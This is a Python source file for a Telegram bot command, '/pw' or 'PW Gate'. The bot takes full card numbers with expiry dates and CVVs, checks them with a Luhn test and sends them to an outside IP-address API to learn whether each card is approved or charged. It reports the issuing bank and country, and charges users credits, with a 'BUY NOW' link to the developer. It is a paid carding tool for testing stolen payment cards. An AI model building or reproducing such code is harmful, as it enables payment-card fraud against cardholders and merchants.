"""
PW Gate
Command: /pw
"""

from aiogram import Router, F, types
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
import logging
import re
import asyncio
import time
import requests
import random
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

from database import get_user_credits, update_credits, get_user
from bin import get_bin_info
from sub import get_premium_status

router = Router()
user_last_command_time = {}

API_URL = "http://5.83.136.66:8004/payway?cc={cc}"

async def get_user_plan_name(user_id):
    is_premium, _ = await asyncio.to_thread(get_premium_status, user_id)
    if is_premium:
        try:
            user = await asyncio.to_thread(get_user, user_id)
            if user:
                return user.get("plan", "PREMIUM")
            return "PREMIUM"
        except Exception as e:
            logging.error(f"Error fetching plan name: {e}")
        return "PREMIUM"
    return "TRIAL"

def luhn_check(card_number: str) -> bool:
    total = 0
    reverse_digits = card_number[::-1]
    for i, d in enumerate(reverse_digits):
        n = int(d)
        if i % 2 == 1:
            n *= 2
            if n > 9:
                n -= 9
        total += n
    return total % 10 == 0

@router.message(Command("pw"))
async def pw_command(message: types.Message):
    user = message.from_user
    user_id = user.id
    current_time = time.time()

    is_premium, _ = await asyncio.to_thread(get_premium_status, user_id)

    if not is_premium:
        if user_id in user_last_command_time:
            elapsed = current_time - user_last_command_time[user_id]
            if elapsed < 10:
                remaining_time = round(10 - elapsed, 1)
                await message.reply(
                    f"⚠️ <b>𝗦𝗹𝗼𝘄 𝗗𝗼𝘄𝗻!</b>\n"
                    f"𝗣𝗹𝗲𝗮𝘀𝗲 𝘄𝗮𝗶𝘁 <code>{remaining_time}</code> 𝘀𝗲𝗰𝗼𝗻𝗱𝘀.",
                    parse_mode="HTML"
                )
                return
        user_last_command_time[user_id] = current_time

    args = message.text.split()[1:]
    if not args:
        await message.reply(
            "❌ <b>Usage:</b> /pw <code>cc|mm|yy|cvv</code>",
            parse_mode="HTML"
        )
        return

    pattern = r'\b(\d{15,16})[|\s/?\:]+(\d{2,4})[|\s/?\:]+(\d{2,4})[|\s/?\:]+(\d{3,4})\b'
    match = re.search(pattern, args[0])
    if not match:
        await message.reply("❌ <b>Invalid Card Format.</b>", parse_mode="HTML")
        return

    cc, mm, yy_raw, cvv = match.groups()
    yy = yy_raw[2:] if len(yy_raw) == 4 else yy_raw
    formatted_cc = f"{cc}|{mm}|{yy}|{cvv}"

    if not luhn_check(cc):
        await message.reply("❌ <b>Invalid Card</b>", parse_mode="HTML")
        return

    current_credits = await asyncio.to_thread(get_user_credits, user_id)
    if current_credits is None or current_credits <= 0:
        await message.reply("❌ <b>Insufficient Credits!</b>", parse_mode="HTML")
        return

    plan_name = await get_user_plan_name(user_id)
    proc_msg = await message.reply("<pre>Processing…⏳</pre>", parse_mode="HTML")
    
    try:
        resp = requests.get(API_URL.format(cc=formatted_cc), timeout=60, verify=False)
        if resp.status_code == 200:
            data = resp.json()
            status = data.get('status', '').upper()
            message_text = data.get('message', 'Unknown')
            
            if status in ['APPROVED', 'CHARGED']:
                final_status = "✅ 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗"
                await asyncio.to_thread(update_credits, user_id, current_credits - 1)
            else:
                final_status = "❌ 𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗"
        else:
            final_status = f"⚠️ ERROR (HTTP {resp.status_code})"
            message_text = "API Error"
    except Exception as e:
        final_status = "⚠️ 𝗘𝗥𝗥𝗢𝗥"
        message_text = str(e)[:80]

    bin_info = await get_bin_info(cc[:6])
    user_link = f'<a href="tg://user?id={user_id}">{user.first_name}</a>'
    dev_link = '<a href="https://t.me/npnbit4">npnbit4</a>'

    caption = (
        f"Status ➛ {final_status}\n"
        f"Card ➛ <code>{formatted_cc}</code>\n"
        f"Gateway ➛ PW\n"
        f"Response ➛ <b>{message_text}</b>\n"
        f"Brand ➛ <b>{bin_info.get('scheme', 'Unknown')}</b>\n"
        f"Issuer ➛ <b>{bin_info.get('bank', 'Unknown')}</b>\n"
        f"Country ➛ <b>{bin_info.get('country', 'Unknown')}</b>\n"
        f"User ➛ {user_link} ({plan_name})\n"
        f"Dev ➛ {dev_link}"
    )

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💎 𝗕𝗨𝗬 𝗡𝗢𝗪", url="https://t.me/npnbit4")]
    ])

    await proc_msg.edit_text(text=caption, parse_mode="HTML", reply_markup=kb)
